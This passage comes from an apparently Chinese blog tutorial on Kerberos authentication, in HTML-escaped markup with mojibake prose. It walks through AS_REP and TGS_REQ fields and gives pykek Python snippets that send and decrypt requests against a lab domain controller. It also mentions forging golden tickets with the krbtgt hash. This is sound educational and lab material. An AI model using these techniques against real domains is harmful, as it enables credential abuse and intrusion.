rsaES_OAEP_ENV_OID = 14,
des_ede3_cbc_Env_OID = 15,
des3_cbc_sha1_kd = 16,
aes128_cts_hmac_sha1 = 17,
aes256_cts_hmac_sha1 = 18,
rc4_hmac = 23,
rc4_hmac_exp = 24,
subkey_keymaterial = 65
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;addresses&lt;/strong&gt;ï¼šå®¢æˆ·ç«¯IPåœ°å€æˆ–è€…æ˜¯è®¡ç®—æœºåç§°ã€‚æˆ‘è¿™é‡Œæ˜¯WIN7ï¼Œä½¿ç”¨çš„ç±»å‹æ˜¯NetBios&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;7.5.3.  Address Types
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Address Type                   Value
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   IPv4                             2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Directional                      3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ChaosNet                         5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   XNS                              6
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ISO                              7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   DECNET Phase IV                 12
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   AppleTalk DDP                   16
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   NetBios                         20
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   IPv6                            24
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å€Ÿé‰´ä¸€ä¸‹&lt;a href=&#34;https://www.tarlogic.com/blog/how-kerberos-works/&#34;&gt;Kerberos (I): How does Kerberos work? â€“ Theory&lt;/a&gt;çš„å›¾ï¼ˆæ‡’ï½ï¼‰ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/KRB_AS_REQ.jpg&#34; alt=&#34;KRB_AS_REQ&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;as_rep&#34;&gt;AS_REP&lt;/h3&gt;
&lt;p&gt;æ¥æ”¶åˆ°è¯·æ±‚åï¼ŒKDCé€šè¿‡è§£å¯†æ—¶é—´æˆ³éªŒè¯ç”¨æˆ·èº«ä»½ï¼Œå¦‚æœä¿¡æ¯æ˜¯æ­£ç¡®çš„è¯ï¼Œé‚£ä¹ˆå®ƒä¼šå“åº”ä¸€ä¸ªAS_REPï¼Œå…ˆæ¥çœ‹ä¸‹WiresharkæŠ“åŒ…çš„è¿”å›åŒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/as_rep.png&#34; alt=&#34;as_rep&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œçš„pvnoã€msg-typeã€crealmã€cnameè¿™å‡ é¡¹è·Ÿreqçš„ä¸€æ ·ï¼Œè¿™é‡Œå°±ä¸å±•å¼€å¯ä»¥è¿”å›ä¸Šé¢çœ‹ä¸€ä¸‹å…·ä½“ä½œç”¨ã€‚as_repçš„åŒ…ä¸»è¦æ˜¯ticketå’Œenc-partè¿™ä¸¤éƒ¨åˆ†ã€‚&lt;/p&gt;
&lt;p&gt;å…ˆæ¥è¯´è¿™ä¸ªticketçš„å†…å®¹ï¼Œæœ¬è´¨è¿™ä¸ªå°±æ˜¯KDCè¿”å›æ¥çš„ä¸€å¼ TGTç¥¨æ®ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;tkt-vnoï¼šè¿™é‡Œæ˜¯ç¥¨æ®æ ¼å¼çš„ç‰ˆæœ¬å·&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;realmï¼šæ´¾å‘ç¥¨æ®çš„åŸŸ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;snameï¼šè·Ÿreqçš„ä½œç”¨æ˜¯ä¸€æ ·çš„&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;enc-partï¼šè¿™ä¸ªç”¨äºTGS_REQçš„è®¤è¯ã€‚ç”¨æˆ·ä¸å¯è¯»å–é‡Œé¢çš„å†…å®¹ã€‚æ˜¯ä½¿ç”¨krbtgtçš„hashè¿›è¡ŒåŠ å¯†çš„ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬æ‹¥æœ‰krbtgtçš„hashå°±å¯ä»¥è‡ªå·±åˆ¶ä½œä¸€ä¸ªticketï¼Œæ—¢é»„é‡‘ç¥¨æ®ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨rfc4120ä¸­ä¹Ÿç§°ä¸º&lt;code&gt;EncTicketPart&lt;/code&gt;ï¼Œè¿™ä¸€éƒ¨åˆ†åŒ…å«ä»¥ä¸‹å‚æ•°çš„å†…å®¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EncTicketPart   ::= [APPLICATION 3] SEQUENCE {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    flags                   [0] TicketFlags,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    key                     [1] EncryptionKey,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    crealm                  [2] Realm,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    cname                   [3] PrincipalName,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    transited               [4] TransitedEncoding,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    authtime                [5] KerberosTime,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    starttime               [6] KerberosTime å¯é€‰,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    endtime                 [7] KerberosTime,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    renew-till              [8] KerberosTime å¯é€‰,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    caddr                   [9] HostAddresses å¯é€‰,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    authorization-data      [10] AuthorizationData å¯é€‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}		
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ€»çš„æ¥è¯´è¿™å—å°±æ˜¯åŒ…å«äº†ç”¨æˆ·åã€ Login Session Keyï¼ˆkeyï¼‰ã€åŸŸä¿¡æ¯ã€ä¸»ä½“åç§°ã€ç¥¨æ®çš„æœ‰æ•ˆæœŸã€è¿˜æœ‰ä¸€é¡¹æ˜¯PACï¼ˆauthorization-dataï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸‹é¢è¿˜æœ‰ä¸€é¡¹æ˜¯enc-partéƒ¨åˆ†ï¼Œè¿™ä¸€éƒ¨åˆ†çš„æ˜¯ç”¨ç”¨æˆ·çš„hashåŠ å¯†çš„ï¼Œè§£å¯†åå¯ä»¥å¾—åˆ° Login Session Keyï¼Œä¸»è¦æ˜¯é˜²æ­¢è¢«çªƒå–é‡æ”¾æ•°æ®åŒ…ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥ä½¿ç”¨&lt;a href=&#34;https://github.com/mubix/pykek&#34;&gt;pykek&lt;/a&gt;é¡¹ç›®æ¥æ¨¡æ‹Ÿå‘åŒ…å’Œè§£å¯†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;localtime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strftime&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getrandbits&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;kek.crypto&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;generate_subkey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ntlm_hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RC4_HMAC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HMAC_MD5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;user_key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RC4_HMAC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;ntlm_hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;p@ssw0rd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;digest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;as_req&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;build_as_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;hack.lab&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;lucky&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getrandbits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pac_request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as_req&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;send_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;as_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;172.16.0.106&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;recv_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;as_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as_rep_enc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decrypt_as_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as_rep_enc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾ï¼Œè§£å¯†å‡ºæ¥çš„session-keyï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™éƒ¨åˆ†çš„ Login Session Keyå’ŒTGTç¥¨æ®ä¼šåœ¨ä¸‹ä¸€ä¸ªé˜¶æ®µç”¨åˆ°ã€‚&lt;/p&gt;
&lt;h2 id=&#34;tgsè®¤è¯&#34;&gt;TGSè®¤è¯&lt;/h2&gt;
&lt;h3 id=&#34;tgs_req&#34;&gt;TGS_REQ&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ç»è¿‡ä¸Šé¢çš„æ­¥éª¤ï¼Œå®¢æˆ·ç«¯è·å¾—äº† TGTç¥¨æ® å’Œ Login Session Keyã€‚&lt;/li&gt;
&lt;li&gt;ç”¨è‡ªå·±çš„å¯†ç NTLM Hashè§£å¯†Login Session Keyå¾—åˆ°åŸå§‹çš„Logon Session Keyã€‚&lt;/li&gt;
&lt;li&gt;å®ƒä¼šåœ¨æœ¬åœ°ç¼“å­˜æ­¤ TGTç¥¨æ®å’Œ åŸå§‹çš„Login Session Keyã€‚å¦‚æœç°åœ¨å®ƒéœ€è¦è®¿é—®æŸå°æœåŠ¡å™¨çš„æŸä¸ªæœåŠ¡ï¼Œå®ƒå°±éœ€è¦å‡­å€Ÿè¿™å¼ TGTç¥¨æ®å‘KDCç”³è¯·ç›¸åº”çš„STæœåŠ¡ç¥¨æ®ï¼ˆService Ticketï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;STæœåŠ¡ç¥¨æ®æ˜¯é€šè¿‡KDCçš„å¦ä¸€ä¸ªæœåŠ¡ TGSé¢å‘çš„ã€‚&lt;/li&gt;
&lt;li&gt;åœ¨è¿™ä¸ªé˜¶æ®µï¼Œå¾®è½¯å¼•å…¥äº†ä¸¤ä¸ªæ‰©å±•è‡ªåè®® S4u2self å’Œ S4u2Proxy(å½“å§”æ´¾çš„æ—¶å€™ï¼Œæ‰ç”¨çš„åˆ°)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¸‹é¢æ˜¯TGS_REQçš„æ•°æ®åŒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/tgs_req.png&#34; alt=&#34;tgs_req&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¤§é¡¹çš„ä¸»è¦æœ‰pvnoã€msg-typeã€req-bodyã€padataï¼Œç›¸ä¿¡å‰é¢ä¸‰é¡¹é€šè¿‡ä¸Šé¢çš„äº†è§£å·²ç»çŸ¥é“äº†ï¼Œè¿™å—æˆ‘ä»¬ä¸»è¦æ˜¯å¯¹padataé‡Œé¢çš„å†…å®¹è¿›è¡Œåˆ†æã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;padata&lt;/strong&gt;é‡Œé¢ä¹ŸåŒ…å«äº†å„ç§ç‰ˆæœ¬å’Œç±»å‹ï¼Œæˆ‘ä»¬ä¸»è¦æ˜¯çœ‹padata-valueå’Œap-reqè¿™ä¸¤é¡¹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;padata-valueï¼šè¿™ä¸€ä¸²ä¸œè¥¿åŒ…å«äº†ä½¿ç”¨ç”¨æˆ·åã€åŸŸã€å½“å‰æ—¶é—´ã€TGTç¥¨æ®ï¼ˆä¹Ÿå°±æ˜¯AS_REPå½“ä¸­çš„ticket-&amp;gt;enc-partï¼‰ã€authenticatorï¼Œè¿™äº›ä¸‹é¢éƒ½ä¼šè¯´åˆ°çš„ï¼Œåªè¦ç†è§£è¿™ä¸€é¡¹çš„å€¼å°±è¡Œï¼Œæ€»çš„æ¥è¯´å°±æ˜¯ap-reqçš„æ€»å’Œï¼Œå¯ä»¥è¿›è¡Œè§£ç å¾—åˆ°ap-reqçš„å†…å®¹ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ap-reqï¼šè¿™ä¸€éƒ¨åˆ†åŒ…å«åè®®ç‰ˆæœ¬å·ï¼Œä¸»è¦æ˜¯çœ‹ticketå’Œauthenticatorçš„å†…å®¹ã€‚&lt;/p&gt;
&lt;p&gt;ticketï¼šè¿™é‡Œé¢çš„cipherå°±æ˜¯AS_REPå“åº”è¿‡æ¥çš„TGTç¥¨æ®ï¼Œå¤§å®¶å¯ä»¥ä»”ç»†è§‚å¯Ÿä¸‹ï¼Œä¸¤ä¸ªcipherçš„å€¼æ˜¯ä¸€æ ·çš„&lt;/p&gt;
&lt;p&gt;authenticatorï¼šè¿™é‡Œæ˜¯ç”±AS_REPè§£ç å‡ºæ¥çš„sessions-keyã€msg-typeã€ç”¨æˆ·åã€åŸŸã€chksumï¼ˆè¿™ä¸ªæ˜¯ç”±req_bodyç¼–ç è€Œæ¥ï¼‰ã€æ—¶é—´æˆ³&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;req-body&lt;/strong&gt;ï¼šè¿™ä¸€é¡¹æ˜¯ç”±éœ€è¦è®¿é—®çš„æœåŠ¡ä¿¡æ¯ç»„æˆï¼ŒåŒ…æ‹¬ç›®æ ‡çš„æœåŠ¡æ ‡è¯†ã€æœåŠ¡åç§°ã€åŸŸåï¼Œè¿™ä¸€é¡¹é€šè¿‡RSA_MD5åŠ å¯†ç»„æˆä¸Šé¢authenticatorä¸­çš„chksumã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨&lt;code&gt;pykek&lt;/code&gt;å·¥å…·åŒ…æ¥æ¨¡æ‹Ÿè¿™ä¸€è¿‡ç¨‹çš„å‘åŒ…ï¼Œåœ¨&lt;code&gt;krb5.py&lt;/code&gt;æœ€ä¸‹é¢åŠ å…¥ä¸‹é¢çš„ä»£ç è¿è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;localtime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strftime&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getrandbits&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;kek.crypto&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;generate_subkey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ntlm_hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RC4_HMAC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HMAC_MD5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;kek.pac&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;build_pac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pretty_print_pac&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;user_key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RC4_HMAC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;ntlm_hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;p@ssw0rd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;digest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;user_realm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hack.lab&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;user_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;lucky&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;target_realm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;dc.hack.lab&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;current_time&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;nonce&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getrandbits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;as_req&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;build_as_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_realm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;current_time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pac_request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
